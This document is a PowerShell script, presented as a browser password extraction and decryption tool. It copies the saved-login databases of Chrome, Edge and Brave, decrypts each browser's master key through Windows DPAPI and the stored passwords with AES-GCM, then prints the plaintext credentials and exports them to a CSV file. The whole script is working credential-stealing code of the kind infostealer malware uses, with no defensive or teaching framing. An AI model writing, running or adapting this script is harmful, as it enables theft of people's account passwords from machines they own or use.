# Browser Password Extraction & Decryption Script
# Extracts and decrypts passwords from Chrome, Edge, and Brave browsers

param(
    [switch]$ForceSQLiteReinstall,
    [string]$CSVPath = ".\DecryptedPasswords.csv"
)

# Add required assemblies
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

# Function to check if SQLite3 is already available
function Test-SQLiteAvailable {
    try {
        $version = sqlite3 --version 2>$null
        if ($version -like "3.*") {
            Write-Host "SQLite3 is already available: $version" -ForegroundColor Green
            return $true
        }
    } catch {
        if (Test-Path ".\sqlite3.exe") {
            Write-Host "SQLite3 found in current directory" -ForegroundColor Green
            return $true
        }
    }
    return $false
}

# Function to install SQLite3 if needed
function Install-SQLiteIfNeeded {
    param([bool]$ForceReinstall = $false)
    
    if ((-not $ForceReinstall) -and (Test-SQLiteAvailable)) {
        return $true
    }
    
    Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
    try {
        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
        $tempZip = "sqlite-temp.zip"
        
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
        
        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
        return $true
    } catch {
        Write-Warning "Failed to download SQLite3: $($_.Exception.Message)"
        return $false
    }
}

# Function to decrypt data using Windows DPAPI
function Get-DecryptedData {
    param([byte[]]$EncryptedData)
    
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "[DPAPI Failed]"
    }
}

# Function to extract master key from browser's Local State file
function Get-BrowserMasterKey {
    param([string]$DataPath)
    
    $localStatePath = Join-Path $DataPath "Local State"
    if (-not (Test-Path $localStatePath)) {
        return $null
    }
    
    try {
        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localStateContent.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            return $null
        }
        
        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
        
        if ($encryptedKeyBytes.Length -gt 5 -and 
            [System.Text.Encoding]::ASCII.GetString($encryptedKeyBytes, 0, 5) -eq "DPAPI") {
            $keyToDecrypt = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
            $decryptedKeyString = Get-DecryptedData $keyToDecrypt
            
            if ($decryptedKeyString -and $decryptedKeyString -ne "[DPAPI Failed]") {
                return [System.Text.Encoding]::UTF8.GetBytes($decryptedKeyString)
            }
        }
        return $null
    } catch {
        return $null
    }
}

# Function to try multiple decryption methods
function Get-DecryptedPassword {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    
    # Method 1: Try direct DPAPI decryption first
    try {
        $result = Get-DecryptedData $EncryptedData
        if ($result -ne "[DPAPI Failed]") {
            return $result
        }
    } catch {}
    
    # Method 2: Check if it's modern encryption (v10/v11 prefix)
    if ($EncryptedData.Length -gt 3) {
        $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedData, 0, 3)
        if (($prefix -eq "v10" -or $prefix -eq "v11") -and $MasterKey) {
            return Get-DecryptedModernPassword $EncryptedData $MasterKey
        }
    }
    
    # Method 3: Try alternative approaches
    try {
        # Check if it might be base64 encoded
        $asString = [System.Text.Encoding]::UTF8.GetString($EncryptedData)
        if ($asString -match "^[a-zA-Z0-9+/=]{20,}$") {
            try {
                $decodedBytes = [System.Convert]::FromBase64String($asString)
                $result = Get-DecryptedData $decodedBytes
                if ($result -ne "[DPAPI Failed]") {
                    return $result
                }
            } catch {}
        }
    } catch {}
    
    return "[Decryption Failed]"
}

# Simplified modern password decryption function
function Get-DecryptedModernPassword {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    
    try {
        # For .NET 5+ with proper AES-GCM support
        try {
            Add-Type -AssemblyName System.Security.Cryptography.Algorithms
            
            if ($EncryptedData.Length -lt 15) {
                return "[Invalid Data]"
            }
            
            # Extract components: v10/v11 (3 bytes) | nonce (12 bytes) | ciphertext | tag (16 bytes)
            $nonce = $EncryptedData[3..14]
            $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]
            $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
            
            $plaintext = New-Object byte[]($ciphertext.Length)
            
            $aesGcm = New-Object System.Security.Cryptography.AesGcm($MasterKey)
            $aesGcm.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            
            return [System.Text.Encoding]::UTF8.GetString($plaintext)
        } catch {
            # Fallback to manual implementation or return error
            return "[AES-GCM Failed]"
        }
    } catch {
        return "[Modern Decryption Error]"
    }
}

# Function to extract and decrypt passwords from a browser
function Get-BrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$DataPath
    )
    
    Write-Host "Processing $BrowserName..." -ForegroundColor Yellow
    
    $loginDataPath = Join-Path $DataPath "Default\Login Data"
    if (-not (Test-Path $loginDataPath)) {
        return @()
    }
    
    $masterKey = Get-BrowserMasterKey $DataPath
    if ($masterKey) {
        Write-Host "Extracted master key for $BrowserName" -ForegroundColor Green
    }
    
    $results = @()
    
    try {
        $tempDbPath = "temp_$([System.IO.Path]::GetRandomFileName()).db"
        Copy-Item $loginDataPath $tempDbPath -Force
        
        $tempCsvPath = "temp_output_$([System.IO.Path]::GetRandomFileName()).csv"
        $query = "SELECT origin_url, username_value, password_value, hex(password_value) as password_hex FROM logins;"
        
        if (Test-Path ".\sqlite3.exe") {
            $sqlitePath = ".\sqlite3.exe"
        } else {
            $sqlitePath = "sqlite3"
        }
        
        & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
        
        if (Test-Path $tempCsvPath) {
            $logins = Import-Csv $tempCsvPath
            
            foreach ($login in $logins) {
                $decryptedPassword = "[No Data]"
                
                if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
                    try {
                        $hexString = $login.password_hex
                        $passwordBytes = [byte[]]::new($hexString.Length / 2)
                        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
                            $passwordBytes[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)
                        }
                        
                        $decryptedPassword = Get-DecryptedPassword $passwordBytes $masterKey
                    } catch {
                        $decryptedPassword = "[Error: $($_.Exception.Message)]"
                    }
                }
                
                $results += [PSCustomObject]@{
                    Browser = $BrowserName
                    URL = $login.origin_url
                    Username = $login.username_value
                    Password = $decryptedPassword
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            }
            
            Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
        }
        
        Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Warning "Error processing $BrowserName: $($_.Exception.Message)"
    }
    
    return $results
}

# Main execution
Write-Host "Browser Password Extraction & Decryption Tool" -ForegroundColor Green
Write-Host "=============================================" -ForegroundColor Green

$response = Read-Host "Press Enter to continue or 'X' to exit"
if ($response -eq 'X' -or $response -eq 'x') { exit }

if (-not (Install-SQLiteIfNeeded -ForceReinstall $ForceSQLiteReinstall)) {
    Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
    exit 1
}

$browsers = @(
    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
)

$allPasswords = @()

foreach ($browser in $browsers) {
    if (Test-Path $browser.DataPath) {
        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
        $allPasswords += $passwords
    }
}

if ($allPasswords.Count -gt 0) {
    Write-Host "`nProcessed $($allPasswords.Count) passwords:" -ForegroundColor Green
    
    $successCount = ($allPasswords | Where-Object { $_.Password -notmatch "\[.*\]" }).Count
    $successRate = [math]::Round(($successCount / $allPasswords.Count) * 100, 2)
    
    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    try {
        # Close CSV file if open
        try {
            $excelProcesses = Get-Process -Name "EXCEL" -ErrorAction SilentlyContinue
            if ($excelProcesses) {
                $excelProcesses | ForEach-Object { $_.CloseMainWindow() | Out-Null }
                Start-Sleep -Seconds 2
            }
        } catch {}
        
        $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
        Write-Host "`nExported to: $CSVPath" -ForegroundColor Green
        Write-Host "Success rate: $successRate% ($successCount/$($allPasswords.Count))" -ForegroundColor Cyan
        
    } catch {
        Write-Warning "CSV export failed: $($_.Exception.Message)"
    }
    
    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
        $successCount = ($_.Group | Where-Object { $_.Password -notmatch "\[.*\]" }).Count
        [PSCustomObject]@{
            Browser = $_.Name
            Total = $_.Count
            Decrypted = $successCount
            SuccessRate = "$([math]::Round(($successCount / $_.Count) * 100, 2))%"
        }
    }
    
    Write-Host "`nSummary:" -ForegroundColor Cyan
    $browserStats | Format-Table -AutoSize
} else {
    Write-Host "No passwords found." -ForegroundColor Yellow
}

Write-Host "`nDone." -ForegroundColor Green
